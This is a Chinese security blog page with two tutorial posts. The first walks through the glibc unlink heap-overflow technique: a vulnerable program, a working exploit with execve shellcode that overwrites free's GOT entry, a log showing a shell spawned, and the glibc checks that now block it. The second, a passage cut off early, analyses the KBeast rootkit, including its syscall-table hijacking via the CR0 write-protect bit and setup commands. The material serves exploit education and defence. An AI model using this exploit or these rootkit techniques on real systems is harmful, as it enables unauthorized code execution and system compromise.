<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Index of Computer System and Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="computer system, computer security" />
  
  
  
  
  <meta name="description" content="FROM 0 TO 1">
<meta property="og:type" content="website">
<meta property="og:title" content="Index of Computer System and Security">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Index of Computer System and Security">
<meta property="og:description" content="FROM 0 TO 1">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Index of Computer System and Security">
<meta name="twitter:description" content="FROM 0 TO 1">
  
    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>

<body>
  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            <a href="/" title="Index of Computer System and Security" rel="home">
              Index of Computer System and Security</a>
          </h1>
          <div class="site-description">FROM 0 TO 1</div>

            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">系统安全</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">体系结构</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">虚拟化</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/malware">恶意代码</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">主流会议</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">学术专家</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/celebrity">工业大咖</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">本站达人</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/donation">打赏支持</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>




  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main">
  
    <article id="post-heapoverflow-unlink"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/heapoverflow-unlink/">Unlink堆溢出</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/heapoverflow-unlink/" class="article-date">
	  <time datetime="2017-01-04T10:06:46.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><p>chunk是指具体进行内存分配的区域，目前的默认大小是4M。 </p>
<p><u>阅读基础</u></p>
<p><a href="http://www.csyssec.org/20170104/glibcmalloc" target="_blank" rel="external">深入理解glibc malloc</a></p>
<p>这篇文章，我们会学习到如何利用unlink技术成功利用堆缓冲区溢出。在深入了解unlink技术之前，我们先来看看一个漏洞程序：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> Heap overflow vulnerable program. </div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面漏洞程序的第三行会导致堆缓冲区溢出。用户输入的’argv[1]’被拷贝到’first’堆缓冲区，而没有设定任何大小限制。因此，当用户的输入大于666字节时，边界就会覆盖下一个chunk的chunk头。这种溢出进而会导致任意代码执行。</p>
<p>下面是漏洞程序堆内存的形象图:</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p><u>Unlink</u>: 其主要思想是欺骗’glibc malloc’来达到解开(unlink) ‘second’ chunk的目的。当解开(unlinking) 时，free函数的GOT表项就会被shellcode的地址覆盖。 成功覆盖之后，在漏洞代码中第五行当free被调用时，shellcode就会被执行。还不清楚？没问题，我们先来看看当fre执行的时候’glibc malloc’都做了些什么。</p>
<p>如果没有攻击中的影响，第[4]行中的<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c" target="_blank" rel="external">free</a>会做下面这些事情：</p>
<ul>
<li>对于<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L10" target="_blank" rel="external">没有被映射的chunks来说</a>，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
<li>向后合并：<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L17" target="_blank" rel="external">查找前一个chunk是否空闲</a>- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L18" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
</ul>
</li>
<li>向前合并:<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L26" target="_blank" rel="external">查找下一个chunk是否空闲</a>- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则shuoming 说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针是top chunk，并且它的PREV_INUSE位已经设置，说明下一个chunk ‘second’不是空闲的。</li>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L30" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向前合并。</li>
</ul>
</li>
<li>现在，<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L41" target="_blank" rel="external">将被合并的chunk添加到未排序的bin中</a>。在我们的例子中，合并未能成功执行，所以只要将’first’ chunk添加到未排序的bin中。</li>
</ul>
<p>现在我们可以说攻击者在第[3]行按照以下方式覆盖了’second’ chunk的chunk头部：</p>
<ul>
<li>prev_size = 偶数，因此PREV_INUSE没有被设置</li>
<li>size = -4</li>
<li>fd = free地址 -12</li>
<li>bk = shellcode地址</li>
</ul>
<p>如果受到攻击者的影响，第[4]行中的free会做以下事情：</p>
<ul>
<li>对于没有被映射的chunks来说，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
<li>向后合并：<ul>
<li>查找前一个chunk是否空闲- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
<li>如果空闲，则合并 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
</ul>
</li>
<li>向前合并:<ul>
<li>查找下一个chunk是否空闲- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针不是(NOT)top chunk。由于攻击者已经用-4覆盖了’second’ chunk的大小，’second’ chunk的下下个chunk应该在-4偏移处。因此，现在’glibc malloc’将’second’ chunk的prev_inuse当做下下个chunk的大小域。由于攻击者已经用一个偶数(PREV_INUSE(P)位被复位)覆盖了prev_size，这样就欺骗了’glibc malloc’ 让其相信’second’ chunk是释放的。</li>
<li>如果空闲，则合并] 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk是空闲的，因此’second’ chunk将按以下方式<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c" target="_blank" rel="external">unlink</a>。<pre><code>+  将&apos;second&apos; chunk的fd和bk值相应的拷贝到[FD](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L3)与[BK](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L4)变量。在我们例子中，FD =free地址-12， BK=shellcode地址 (作为堆溢出的一部分，攻击者将shellcode放入&apos;first&apos;堆缓冲区内部）。
+  [BK的值被拷贝到FD的12偏移处](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L5)。在我们的例子中，将12字节加入到FD中，然后指向free的GOT表项。这样一来，GOT表项就被shellcode的地址覆盖了。太棒了！现在，任何时候只要free被调用，就会执行shellcode! 因此，漏洞程序中的第五行就会导致shellcode的执行。
</code></pre></li>
</ul>
</li>
<li>现在，将被合并的chunk添加到未排序的bin中。</li>
</ul>
<p>被攻击者修改过的用户输入，漏洞程序的堆内存的形象图如下：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>理解了unlink技术之后，我们就可以写漏洞利用程序了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit 'vuln' using unlink technique.</div><div class="line"> */</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#define FUNCTION_POINTER ( 0x0804978c )         //Address of GOT entry for free function obtained using "objdump -R vuln".</div><div class="line">#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable 'first' in vuln executable. </div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line">#define DUMMY 0xdefaced</div><div class="line">#define PREV_INUSE 0x1</div><div class="line"></div><div class="line">char shellcode[] =</div><div class="line">        /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</div><div class="line">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </div><div class="line">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</div><div class="line">        "\xeb\x0assppppffff"</div><div class="line">        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";</div><div class="line"></div><div class="line">int main( void )</div><div class="line">&#123;</div><div class="line">        char * p;</div><div class="line">        char argv1[ 680 + 1 ];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, NULL &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        /* the fd field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the bk field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the fd_nextsize field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* the bk_nextsize field of the first chunk */</div><div class="line">        *( (void **)p ) = (void *)( DUMMY );</div><div class="line">        p += 4;</div><div class="line">        /* Copy the shellcode */</div><div class="line">        memcpy( p, shellcode, strlen(shellcode) );</div><div class="line">        p += strlen( shellcode );</div><div class="line">        /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </div><div class="line">        of first chunk */</div><div class="line">        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );</div><div class="line">        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );</div><div class="line">        /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</div><div class="line">        *( (size_t *)p ) = (size_t)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += 4;</div><div class="line">        /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</div><div class="line">        *( (size_t *)p ) = (size_t)( -4 );</div><div class="line">        p += 4;</div><div class="line">        /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</div><div class="line">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </div><div class="line">        second chunk's bk field (see below) */</div><div class="line">        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );</div><div class="line">        p += 4;</div><div class="line">        /* the bk field of the second chunk. It should point to shell code address.*/</div><div class="line">        *( (void **)p ) = (void *)( CODE_ADDRESS );</div><div class="line">        p += 4;</div><div class="line">        /* the terminating NUL character */</div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        /* the execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行上面的漏洞利用程序，可以触发一个新的shell!</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ ./<span class="built_in">exp</span> </div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$</div></pre></td></tr></table></figure>
<p><u>保护</u>: 现如今，’glibc malloc’经过许多年的发展已经被强化了(hardened)，unlink已经技术无法成功执行。为了防御unlink技术带来的堆溢出，’glibc malloc’加入了下面的检查：</p>
<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3947" target="_blank" rel="external">两次释放(Double Free)</a>: 释放已经处于空闲状态的chunk是禁止的。当攻击者试图将’second’ chunk的大小覆盖为-4, 其PREV_INUSE位被复位，意味着’first’已经处于空闲状态。这时’glibc malloc’会抛出一个两次释放错误。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</div><div class="line">    &#123;</div><div class="line">      errstr = <span class="string">"double free or corruption (!prev)"</span>;</div><div class="line">      <span class="keyword">goto</span> errout;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3954" target="_blank" rel="external">无效的next size</a>: 下一个chunk的大小介于8字节与arena的总系统内存之间。当攻击者试图将’second’ chunk的大小覆盖为-4,’glibc malloc’会抛出一个无效的next size错误</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</div><div class="line">        <span class="keyword">goto</span> errout;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">损坏的双链表</a>： 前一个chunk的fd和下一个chunk的bk必须指向当前被unlinked的chunk。当攻击者分别将fd和bk覆盖为-12与shellcode地址， free和(shellcode地址+8)没有指向当前被unlinked的chunk(‘second’)。 ‘glibc malloc’会抛出一个损坏的双链表错误.</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </div><div class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</div></pre></td></tr></table></figure>
<p><u>注意</u>：为了更好的演示，漏洞程序在编译的时候没有添加以下保护机制：</p>
<p><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a><br><a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="external">NX</a><br><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank" rel="external">RELRO(ReLocation Read-Only)</a></p>
<p>参考</p>
<p><a href="http://phrack.org/issues/57/8.html" target="_blank" rel="external">vudo malloc tricks</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-kbeastanalysis"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/kbeastanalysis/" class="article-date">
	  <time datetime="2017-01-04T08:12:27.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/04/03/kbeast-analysis-detection/" target="_blank" rel="external">个人博客</a>，该文深入分析了KBeast的原理以及源代码，并给出了检测KBeast实验方法，KBeast是学习内核层恶意代码不错的样本。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<blockquote>
<ul>
<li>0x01 全文环境</li>
<li>0X02 Kbeast 特性</li>
<li>0X03 系统调用劫持基础</li>
<li>0X04 Kbeast 使用</li>
<li>0X05 Kbeast 核心</li>
<li>0X06 Libvmi and Volatility检测KBeast</li>
</ul>
</blockquote>
<hr>
<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility</p>
<p>其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。</p>
<h3 id="0X02-Kbeast-特性"><a href="#0X02-Kbeast-特性" class="headerlink" title="0X02 Kbeast 特性"></a>0X02 Kbeast 特性</h3><p>以下是Kbeast实现的功能：</p>
<ul>
<li>隐藏可加载模块（LKM)</li>
<li>隐藏文件/目录</li>
<li>隐藏进程（ps,pstree,top,lsof)</li>
<li>隐藏套接字和网络连接(netstat,lsof)</li>
<li>记录键盘操作捕获用户行为</li>
<li>反杀死进程</li>
<li>反移除文件</li>
<li>反删除可加载模块</li>
<li>root提权后门</li>
<li>远程绑定后门 </li>
</ul>
<h3 id="0X03-系统调用劫持基础"><a href="#0X03-系统调用劫持基础" class="headerlink" title="0X03 系统调用劫持基础"></a>0X03 系统调用劫持基础</h3><p>上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：</p>
<pre><code>extern void *sys_call_table[];
sys_call_table[__NR_syscall] = pointer
</code></pre><p>而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：</p>
<pre><code>grep sys_call_table /boot/System.map-2.6.32-21-generic
</code></pre><p>显示的结果为</p>
<pre><code>c0592150 R sys_call_table
</code></pre><p>c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考<a href="https://en.wikipedia.org/wiki/Control_register#CR0" target="_blank" rel="external">CR0</a>. </p>
<p>如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：</p>
<pre><code>write_cr0 (read_cr0 () &amp; (~ 0x10000));
</code></pre><h3 id="0X04-Kbeast-使用"><a href="#0X04-Kbeast-使用" class="headerlink" title="0X04 Kbeast 使用"></a>0X04 Kbeast 使用</h3><p>下载<a href="https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html" target="_blank" rel="external">Kbeast</a>. </p>
<pre><code>tar xzf ipsecs-kbeast-v1.tar.gz
cd kbeast-v1
./setup build 1  
